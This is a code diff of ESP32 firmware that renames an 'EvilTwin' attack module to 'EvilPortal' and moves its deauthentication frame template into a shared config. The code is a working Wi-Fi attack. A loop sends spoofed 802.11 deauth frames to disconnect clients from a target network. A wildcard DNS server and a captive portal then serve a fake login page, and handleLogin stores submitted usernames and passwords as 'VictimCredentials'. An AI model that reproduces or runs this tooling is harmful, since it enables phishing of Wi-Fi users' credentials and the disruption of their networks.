@@ -1,21 +1,22 @@
-#include "EvilTwin.h"
+#include "EvilPortal.h"
 #include "App.h"
 #include "SdCardManager.h"
 #include "Logger.h"
 #include <esp_wifi.h>
+#include "Config.h"
 
 // --- INITIALIZE STATIC MEMBERS ---
-EvilTwin* EvilTwin::instance_ = nullptr;
+EvilPortal* EvilPortal::instance_ = nullptr;
 
-const uint8_t EvilTwin::deauth_frame_template[] = {
-    0xc0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: BROADCAST
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Set to target BSSID
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Set to target BSSID
-    0xf0, 0xff, 0x02, 0x00 // Reason code: 2 (Previous auth no longer valid)
-};
+// const uint8_t EvilPortal::deauth_frame_template[] = {
+//     0xc0, 0x00, 0x3a, 0x01,
+//     0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: BROADCAST
+//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: Set to target BSSID
+//     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: Set to target BSSID
+//     0xf0, 0xff, 0x02, 0x00 // Reason code: 2 (Previous auth no longer valid)
+// };
 
-EvilTwin::EvilTwin() :
+EvilPortal::EvilPortal() :
     app_(nullptr),
     isActive_(false),
     isAttackPending_(false),
@@ -27,7 +28,7 @@ EvilTwin::EvilTwin() :
 }
 
 // --- NEW STATIC EVENT HANDLER ---
-void EvilTwin::onStationConnected(WiFiEvent_t event, WiFiEventInfo_t info) {
+void EvilPortal::onStationConnected(WiFiEvent_t event, WiFiEventInfo_t info) {
     if (instance_ && instance_->isActive()) {
         char macStr[18];
         sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X",
@@ -41,11 +42,11 @@ void EvilTwin::onStationConnected(WiFiEvent_t event, WiFiEventInfo_t info) {
     }
 }
 
-void EvilTwin::setup(App* app) {
+void EvilPortal::setup(App* app) {
     app_ = app;
 }
 
-void EvilTwin::prepareAttack() {
+void EvilPortal::prepareAttack() {
     if (isActive_) stop();
     isAttackPending_ = true;
     capturedCredentials_.clear();
@@ -55,13 +56,13 @@ void EvilTwin::prepareAttack() {
     LOG(LogLevel::INFO, "EVILTWIN", "Attack prepared. State has been reset.");
 }
 
-void EvilTwin::setSelectedPortal(const std::string& portalName) {
+void EvilPortal::setSelectedPortal(const std::string& portalName) {
     selectedPortal_ = portalName;
     // Serial.printf("[EVILTWIN] Portal selected: %s\n", selectedPortal_.c_str());
     LOG(LogLevel::INFO, "EVILTWIN", "Portal selected: %s", selectedPortal_.c_str());
 }
 
-bool EvilTwin::start(const WifiNetworkInfo& target) {
+bool EvilPortal::start(const WifiNetworkInfo& target) {
     if (isActive_ || !isAttackPending_ || selectedPortal_.empty()) {
         // Serial.printf("[EVILTWIN] Attack start failed. State: isActive=%d, isPending=%d, portalEmpty=%d\n", 
         //     isActive_, isAttackPending_, selectedPortal_.empty());
@@ -97,7 +98,7 @@ bool EvilTwin::start(const WifiNetworkInfo& target) {
     return true;
 }
 
-void EvilTwin::stop() {
+void EvilPortal::stop() {
     if (!isActive_) return;
     // Serial.println("[EVILTWIN] Stopping Evil Twin attack.");
     LOG(LogLevel::INFO, "EVILTWIN", "Stopping Evil Twin attack.");
@@ -114,7 +115,7 @@ void EvilTwin::stop() {
     app_->getHardwareManager().setPerformanceMode(false);
 }
 
-void EvilTwin::loop() {
+void EvilPortal::loop() {
     if (!isActive_) return;
     dnsServer_.processNextRequest();
     if (millis() - lastDeauthTime_ > 500) {
@@ -123,26 +124,30 @@ void EvilTwin::loop() {
     }
 }
 
-// <-- ADD THIS IMPLEMENTATION
-void EvilTwin::processDns() {
+void EvilPortal::processDns() {
     dnsServer_.processNextRequest();
 }
 
-void EvilTwin::deauthRoutine() {
+void EvilPortal::deauthRoutine() {
     esp_wifi_set_channel(targetNetwork_.channel, WIFI_SECOND_CHAN_NONE);
-    uint8_t deauth_packet[sizeof(deauth_frame_template)];
-    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));
+    
+    // --- MODIFICATION: Use the centralized template ---
+    uint8_t deauth_packet[sizeof(RawFrames::Mgmt::Deauth::TEMPLATE)];
+    memcpy(deauth_packet, RawFrames::Mgmt::Deauth::TEMPLATE, sizeof(RawFrames::Mgmt::Deauth::TEMPLATE));
+
     memcpy(&deauth_packet[10], targetNetwork_.bssid, 6);
     memcpy(&deauth_packet[16], targetNetwork_.bssid, 6);
+    
     for (int i = 0; i < 5; i++) {
         esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
         delay(2);
     }
+    
     int cloneChannel = (targetNetwork_.channel == 1) ? 6 : 1;
     esp_wifi_set_channel(cloneChannel, WIFI_SECOND_CHAN_NONE);
 }
 
-void EvilTwin::startWebServer() {
+void EvilPortal::startWebServer() {
     dnsServer_.start(53, "*", WiFi.softAPIP());
     // Serial.printf("[EVILTWIN] DNS Server started. AP IP: %s\n", WiFi.softAPIP().toString().c_str());
     LOG(LogLevel::INFO, "EVILTWIN", "DNS Server started. AP IP: %s", WiFi.softAPIP().toString().c_str());
@@ -154,7 +159,7 @@ void EvilTwin::startWebServer() {
     Serial.println("[EVILTWIN] Web Server started.");
 }
 
-void EvilTwin::handleLogin(AsyncWebServerRequest* request) {
+void EvilPortal::handleLogin(AsyncWebServerRequest* request) {
     if (request->hasParam("username") && request->hasParam("password")) {
         
         VictimCredentials victim;
@@ -220,7 +225,7 @@ void EvilTwin::handleLogin(AsyncWebServerRequest* request) {
     }
 }
 
-void EvilTwin::handleCaptivePortal(AsyncWebServerRequest* request) {
+void EvilPortal::handleCaptivePortal(AsyncWebServerRequest* request) {
     if (selectedPortal_.empty()) {
         request->send(500, "text/plain", "Server Error: No portal selected.");
         return;
@@ -234,8 +239,8 @@ void EvilTwin::handleCaptivePortal(AsyncWebServerRequest* request) {
 }
 
 // --- Getter Implementations ---
-bool EvilTwin::isActive() const { return isActive_; }
-bool EvilTwin::isAttackPending() const { return isAttackPending_; }
-const WifiNetworkInfo& EvilTwin::getTargetNetwork() const { return targetNetwork_; }
-int EvilTwin::getVictimCount() const { return capturedCredentials_.size(); }
-const std::vector<VictimCredentials>& EvilTwin::getCapturedCredentials() const { return capturedCredentials_; }
+bool EvilPortal::isActive() const { return isActive_; }
+bool EvilPortal::isAttackPending() const { return isAttackPending_; }
+const WifiNetworkInfo& EvilPortal::getTargetNetwork() const { return targetNetwork_; }
+int EvilPortal::getVictimCount() const { return capturedCredentials_.size(); }
+const std::vector<VictimCredentials>& EvilPortal::getCapturedCredentials() const { return capturedCredentials_; }
